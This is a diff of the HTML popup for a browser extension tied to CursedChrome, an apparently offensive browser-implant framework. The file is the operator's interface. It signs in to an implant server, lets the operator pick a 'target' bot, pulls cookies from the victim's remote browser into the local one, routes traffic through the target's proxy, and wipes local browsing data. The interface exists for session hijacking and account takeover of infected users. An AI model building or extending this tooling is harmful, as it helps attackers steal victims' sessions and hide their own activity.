@@ -1,96 +1,99 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-
 <head>
-    <link href="./css/all.css" rel="stylesheet">
-    <link rel="stylesheet" href="./bootstrap.min.css">
-    <link rel="stylesheet" href="./toastr.css">
-    <link rel="stylesheet" href="./popup-styles.css">
+  <link rel="stylesheet" href="./popup-styles.css">
 </head>
-
 <body>
-    <div id="app">
-        <ul class="nav nav-tabs" id="myTab" role="tablist">
-            <li class="nav-item">
-                <a class="nav-link active" id="home-tab" data-toggle="tab" href="#home" role="tab" aria-controls="home"
-                    aria-selected="true">Configuration</a>
-            </li>
-            <li class="nav-item">
-                <a class="nav-link" id="import-tab" data-toggle="tab" href="#import" role="tab" aria-controls="import"
-                    aria-selected="false">Manager Tool</a>
-            </li>
-        </ul>
-        <div class="tab-content" id="myTabContent">
-            <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
-                <div class="card">
-                    <div class="card-header">
-                        <span id="loader" class="badge badge-secondary">
-                            <span class="spinner-border spinner-border-sm mr-1" role="status"
-                                aria-hidden="true"></span>Loading...
-                        </span>
-                        CursedChrome Cookie Sync Extension
-                    </div>
-                    <div class="card-body" style="min-width: 500px; padding: 20px">
-                        <div>
-                            <h5 class="card-title">Extension Configuration</h5>
-                            <div id="config-message" class="alert alert-danger" role="alert" style="display: none;"></div>
-                            <p class="card-text">
-                            <div class="input-group mb-3">
-                                <div class="input-group-prepend">
-                                    <span class="input-group-text">Web Panel URL</span>
-                                </div>
-                                <input type="text" class="form-control" placeholder="http://localhost:8118" id="config-url">
-                            </div>
-                            <div class="input-group mb-3">
-                                <div class="input-group-prepend">
-                                    <span class="input-group-text">Bot Username</span>
-                                </div>
-                                <input type="text" class="form-control" placeholder="botuserxxxxxxxx" id="config-username">
-                            </div>
-                            <div class="input-group mb-3">
-                                <div class="input-group-prepend">
-                                    <span class="input-group-text">Bot Password</span>
-                                </div>
-                                <input type="password" class="form-control" placeholder="*********" id="config-password">
-                            </div>
-                            </p>
-                            <hr />
-
-                            <button type="button" class="btn btn-block btn-primary" id="sync-cookies-button" disabled>
-                                <i class="fas fa-sync"></i> Sync Remote Implant Cookies
-                            </button>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            <div class="tab-pane fade" id="import" role="tabpanel" aria-labelledby="import-tab">
-                <div class="card">
-                    <div class="card-body" style="min-width: 500px; padding: 20px">
-                        <div>
-                            <div id="import-message" class="alert alert-danger" role="alert" style="display: none;"></div>
-                            <p class="card-text">
-                            <div class="form-group">
-                                <label for="cookieTextarea">Paste Cookies Here (JSON array)</label>
-                                <textarea class="form-control" id="cookieTextarea" rows="3"></textarea>
-                            </div>
-                            <button type="button" class="btn btn-primary" id="import-cookies-button">
-                                <i class="fas fa-file-import"></i> Import Cookies
-                            </button>
-                            <button type="button" class="btn btn-primary" id="clear-data-button">
-                                <i class="fas fa-trash"></i> Clear all Data
-                            </button>
-                            </p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
+  <div id="app">
+    <!-- Login View -->
+    <div id="view-login" class="view">
+      <div class="header">
+        <h1>Cookie Sync</h1>
+        <p class="subtitle">Sign in to manage remote browser cookies</p>
+      </div>
+      <div class="form-group">
+        <label>Server URL</label>
+        <input type="text" id="server-url" placeholder="http://192.168.13.202:8118">
+      </div>
+      <div class="form-group">
+        <label>Username</label>
+        <input type="text" id="login-user" placeholder="admin" autocomplete="username">
+      </div>
+      <div class="form-group">
+        <label>Password</label>
+        <input type="password" id="login-pass" placeholder="Password" autocomplete="current-password">
+      </div>
+      <div id="login-error" class="msg msg-err" style="display:none"></div>
+      <button id="btn-login" class="btn btn-primary btn-block">Sign In</button>
     </div>
-    <script src="./jquery-3.5.1.min.js"></script>
-    <script src="./popper.min.js"></script>
-    <script src="./toastr.min.js"></script>
-    <script src="./bootstrap.bundle.min.js"></script>
-    <script src="./main.js"></script>
-</body>
 
+    <!-- Bot List View -->
+    <div id="view-bots" class="view" style="display:none">
+      <div class="header-row">
+        <h2>Select Target</h2>
+        <button id="btn-logout" class="btn-icon" title="Sign out">&times;</button>
+      </div>
+      <input type="text" id="bot-search" placeholder="Search bots..." class="search-input">
+      <div id="bot-list" class="bot-list"></div>
+      <button id="btn-refresh-bots" class="btn btn-subtle btn-block">Refresh</button>
+    </div>
+
+    <!-- Actions View -->
+    <div id="view-actions" class="view" style="display:none">
+      <div class="header-row">
+        <button id="btn-back" class="btn-icon" title="Back">&larr;</button>
+        <div class="bot-info">
+          <span id="selected-bot-name" class="bot-name"></span>
+          <span id="selected-bot-status" class="status-badge"></span>
+        </div>
+      </div>
+
+      <!-- Tabs -->
+      <div class="tabs">
+        <button class="tab active" data-tab="sync">Sync</button>
+        <button class="tab" data-tab="proxy">Proxy</button>
+        <button class="tab" data-tab="manual">Manual</button>
+        <button class="tab" data-tab="clear">Clean</button>
+      </div>
+
+      <!-- Sync Tab -->
+      <div id="tab-sync" class="tab-content active">
+        <p class="desc">Fetch cookies from the remote browser and import into your local browser. Existing cookies will be cleared first.</p>
+        <button id="btn-sync" class="btn btn-primary btn-block">Sync Cookies</button>
+        <div id="sync-status" class="msg" style="display:none"></div>
+      </div>
+
+      <!-- Proxy Tab -->
+      <div id="tab-proxy" class="tab-content">
+        <p class="desc">Route your browser traffic through the target's proxy connection.</p>
+        <div class="proxy-info">
+          <div class="info-row"><span class="lbl">Host:</span><span id="proxy-host"></span></div>
+          <div class="info-row"><span class="lbl">Port:</span><span id="proxy-port">8080</span></div>
+          <div class="info-row"><span class="lbl">User:</span><span id="proxy-user"></span></div>
+          <div class="info-row"><span class="lbl">Pass:</span><span id="proxy-pass"></span></div>
+        </div>
+        <button id="btn-proxy-on" class="btn btn-primary btn-block">Enable Proxy</button>
+        <button id="btn-proxy-off" class="btn btn-danger btn-block" style="display:none">Disable Proxy</button>
+        <div id="proxy-status" class="msg" style="display:none"></div>
+      </div>
+
+      <!-- Manual Import Tab -->
+      <div id="tab-manual" class="tab-content">
+        <p class="desc">Paste a JSON cookie array to import manually.</p>
+        <textarea id="cookie-json" placeholder='[{"name":"sid","value":"abc","domain":".example.com",...}]' rows="5"></textarea>
+        <button id="btn-import" class="btn btn-primary btn-block">Import Cookies</button>
+        <div id="import-status" class="msg" style="display:none"></div>
+      </div>
+
+      <!-- Clear Tab -->
+      <div id="tab-clear" class="tab-content">
+        <p class="desc">Clear all local browser data including cookies, cache, history, and saved passwords.</p>
+        <button id="btn-clear-cookies" class="btn btn-warn btn-block">Clear All Cookies</button>
+        <button id="btn-clear-all" class="btn btn-danger btn-block">Clear All Browsing Data</button>
+        <div id="clear-status" class="msg" style="display:none"></div>
+      </div>
+    </div>
+  </div>
+  <script src="./main.js"></script>
+</body>
 </html>
